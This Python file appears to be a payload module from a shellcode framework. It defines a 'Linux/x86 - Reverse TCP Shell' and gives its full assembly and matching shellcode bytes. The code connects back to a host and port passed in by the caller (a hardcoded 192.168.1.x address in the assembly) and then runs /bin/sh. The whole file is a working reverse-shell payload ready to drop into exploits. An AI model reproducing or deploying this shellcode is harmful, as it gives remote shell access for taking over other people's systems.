from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
	Shellcode.info["author"] = "xmgv"
	Shellcode.info["name"] = "Linux/x86 - Reverse TCP Shell"
	Shellcode.info["references"] = [
		"https://www.exploit-db.com/exploits/36397/",
		"https://xmgv.wordpress.com/2015/02/21/slae-assignment-2-reverse-shell/",
	]
	Shellcode.info["size"] = 72
	Shellcode.info["rawassembly"] = [
	    "push 0x66",
	    "pop eax",
	    "cdq",               	
	    "push edx",        	
	    "inc edx",
	    "push edx",          	
	    "mov ebx, edx",   	
	    "inc edx",
	    "push edx",         	
	    "mov ecx, esp",      	
	    "int 0x80",          	
	    "xchg ebx, eax",     	
	    "mov ecx, edx",     	
	    "loop:",
	        "mov al, 0x3f",  
	        "int 0x80",
	        "dec ecx",
	        "jns loop",
	    "mov al, 0x66",   	
	    "xchg ebx, edx",    	
	    "push 0x8501A8C0",    	
	    "push word 0x3582",  	
	    "push word bx",     	
	    "inc ebx",          	
	    "mov ecx, esp",    	
	    "push 0x10",        	
	    "push ecx",      	
	    "push edx",        	
	    "mov ecx, esp",    	
	    "int 0x80",         	
	    "push 0xb",          	
	    "pop eax",
	    "cdq",            	
	    "mov ecx, edx",       	
	    "push edx",        	
	    "push 0x68732f2f",    	
	    "push 0x6e69622f",	
	    "mov ebx, esp",    
	    "int 0x80",          	
	]


	def __init__(self, **kwargs): 
		Shellcode.info["payload"] = [
			r"\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42"
			r"\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
			r"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
			+kwargs["host"]+
			r"\x66\x68"
			+kwargs["lport"]+
			r"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52"
			r"\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
			r"\x52\x68\x2f\x2f\x73\x68\x68\x2f"
			r"\x62\x69\x6e\x89\xe3\xcd\x80"

		]

